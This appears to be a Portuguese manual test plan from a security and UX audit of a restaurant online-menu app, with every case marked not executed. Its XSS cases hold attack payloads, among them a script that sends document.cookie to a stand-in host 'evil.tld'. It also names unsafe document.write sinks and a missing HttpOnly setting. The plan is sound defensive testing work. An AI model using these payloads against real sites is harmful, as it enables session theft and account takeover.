# Fase 6.6 — Roteiro manual de testes (cardápio público, XSS, UX e conversão)

**Resultado geral: NÃO EXECUTADO** — a auditoria foi 100% estática (regra 2.5: `DATABASE_URL` =
produção; proibido tocar em produção). Cada caso abaixo traz *Esperado* e *Obtido*.

Ambiente necessário: 2 lojas de teste (uma com `subscriptionStatus = "expired"`, uma `isOpen =
false`), navegador desktop + celular, WhatsApp/Instagram in-app browser.

---

## A. XSS armazenado (F6A-015 / F1C-103 / 6.7)

| # | Caso | Como executar | Esperado | Obtido |
|---|---|---|---|---|
| A1 | Payload no **nome do produto** | No painel, salvar produto com nome `<img src=x onerror=alert(document.domain)>`; abrir `/<slug>` | texto exibido literalmente | **NÃO EXECUTADO** |
| A2 | Payload na **descrição do produto** | idem campo descrição | idem | **NÃO EXECUTADO** |
| A3 | Payload na **observação do pedido** | Fazer pedido com observação `<script>fetch('//evil.tld?c='+document.cookie)</script>`; abrir a comanda de impressão do **KDS** (`kds/screen`), do **caixa** e do **dashboard/pedidos** | texto literal | **NÃO EXECUTADO** |
| A4 | Payload no **nome do cliente** | Cadastro com nome `<svg onload=alert(1)>`; ver comanda + `document.write` | texto literal | **NÃO EXECUTADO** |
| A5 | Roubo de JWT via comanda | Com A3/A4 ativo, confirmar se `localStorage` do operador esvazia/rota (`httpOnly` está ausente — F1C-018) | sem exfiltração | **NÃO EXECUTADO** |
| A6 | **HTML** no endereço do cliente | Endereço com `<b onmouseover=alert(1)>` no cardápio e no pedido | texto literal | **NÃO EXECUTADO** |
| A7 | URL externa no campo `logo` | Definir logo da loja como `https://evil.tld/x.svg` e abrir `/api/icon/<slug>` | sem servir SVG ativo (`Content-Type: image/svg+xml` é executável) | **NÃO EXECUTADO** |

> Os 3 pontos de `document.write` foram **confirmados por leitura** em
> `src/app/kds/(auth)/screen/page.tsx:476`, `src/app/caixa/caixa-page.tsx:951` e
> `src/app/dashboard/(auth)/pedidos/page-content.tsx:738`. A confirmação de exploração (A3–A5)
> é que ficou pendente.

## B. Vazamento de dados no HTML (F6A-001/002/003)

| # | Caso | Como executar | Esperado | Obtido |
|---|---|---|---|---|
| B1 | Credenciais no cardápio | `curl -s https://<host>/<slug> \| grep -Eo 'asaasApiKey\|metaAccessToken\|"password"'` | sem ocorrências | **NÃO EXECUTADO** |
| B2 | Credenciais na página do pedido | `curl -s https://<host>/pedido/<trackingToken>` idem | sem ocorrências | **NÃO EXECUTADO** |
| B3 | 32 campos em `?slug=` | `curl -s "https://<host>/api/establishments?slug=<slug>" \| grep -c 'Key\|Secret\|Token\|Certificate'` | `0` | **NÃO EXECUTADO** |
| B4 | Catálogo com custo/estoque | `curl -s ".../api/categories?establishmentId=<id>" \| grep -c 'unitCost\|stockItem'` | `0` | **NÃO EXECUTADO** |

## C. Criação de pedido (6.3) — ver `6-02-criacao-pedido.sh`

Executar os 9 casos do script e conferir `Esperado: 400/409/422`.

## D. Estados da loja e conversão (6.3/6.5)

| # | Caso | Como executar | Esperado | Obtido |
|---|---|---|---|---|
| D1 | Loja fechada (`isOpen=false`) | Fechar no painel e recarregar `/<slug>` | banner de fechada + checkout bloqueado **e** POST negado | **NÃO EXECUTADO** |
| D2 | Fechamento com página aberta | Deixar `/<slug>` aberta até a loja fechar (relógio) | o sistema desliga o checkout sozinho | **NÃO EXECUTADO** (F6B-005: `isOpen` é `useMemo`, nunca reavaliado) |
| D3 | Pausa manual (`isOpenOverride`) | Pausar no painel, recarregar | cardápio pausado | **NÃO EXECUTADO** (0 referências em `menu-page.tsx`) |
| D4 | Plano expirado | Loja com `subscriptionStatus="expired"` | tela "Cardápio temporariamente indisponível" (existe — `[slug]/page.tsx:89-110`) + API de pedidos **também** nega | **NÃO EXECUTADO** (F6A-024: API aceita) |
| D5 | Mínimo do pedido | Carrinho abaixo do mínimo | compra bloqueada, mensagem clara | **NÃO EXECUTADO** |
| D6 | Área de entrega / CEP | CEP fora do raio | recusa + opção retirada | **NÃO EXECUTADO** (F6B-007: geolocalização morta, `/api/delivery/calculate` nunca chamado no checkout) |
| D7 | Esgotamento | Estoque do produto = 0 | item marcado esgotado e **bloqueado no servidor** | **NÃO EXECUTADO** (F6B-017: cliente nunca vê "esgotado") |
| D8 | Cupom | Aplicar cupom válido/inválido/expirado | desconto calculado **no servidor** | **NÃO EXECUTADO** (rota `/api/coupons/validate` **não existe** — F6B-012) |
| D9 | Duplo clique/timeout no "Fazer pedido" | clique duplo + rede lenta | 1 pedido | **NÃO EXECUTADO** (F6B-006) |
| D10 | Pagamento online → cozinha | Pagar e observar o KDS | pedido **não** aparece antes de `paymentStatus=paid` | **NÃO EXECUTADO** (existe filtro `orders/route.ts:727-746`, mas `body.method` contorna — F6B-001) |

## E. UX e acessibilidade (6.5)

| # | Caso | Esperado | Obtido |
|---|---|---|---|
| E1 | Visitante conclui pedido sem login | sim | **NÃO EXECUTADO** (existe — checkout anônimo) |
| E2 | Máscaras de telefone/CEP/CEP | aplicadas | **NÃO EXECUTADO** (`menu-page.tsx:429-432`, `:7163-7188`) |
| E3 | Estados de loading / erro / vazio / carrinho vazio | presentes | **NÃO EXECUTADO** |
| E4 | WhatsApp/Instagram in-app browser | aviso "abra no navegador" ou fallback | **NÃO EXECUTADO** (F6B-030: 0 detecções de user-agent) |
| E5 | Leitor de tela: navegar cardápio → checkout | foco visível, `alt` nas imagens, `aria-*` | **NÃO EXECUTADO** (F6B-029: 5 `aria-*` em 7.360 linhas) |
| E6 | Teclado: adicionar item, fechar modal, enviar | tudo acessível | **NÃO EXECUTADO** |
| E7 | Compartilhar no WhatsApp: prévia com logo/nome | OG correto | **NÃO EXECUTADO** (`og:image` com 1200×630 fixo — F6B-021) |
| E8 | Desempenho real 4G (LCP/CLS/TTFB) | LCP < 2,5 s | **NÃO EXECUTADO** (fora do alcance — sem dispositivo/rede controlados) |

## F. Desempenho e SEO estático (já executados por leitura)

| # | Verificação | Resultado |
|---|---|---|
| F1 | `src/app/robots.ts` / `sitemap.ts` | **inexistentes** (F6B-021) |
| F2 | `generateMetadata` + OG por loja | **presente** — `src/app/[slug]/page.tsx:20-57` |
| F3 | `menu-page.tsx` | **7.360 linhas / 397 KB** (F6B-022) |
| F4 | `next/image` no cardápio | **0 ocorrências**; 13 `<img>` (F6B-022) |
| F5 | JSON-LD / schema.org | **0 ocorrências** |
| F6 | Cache entre lojas | **sem mistura** — a página lê Prisma por `slug` a cada request (`[slug]/page.tsx:64-74`) e os GETs da API são dinâmicos |
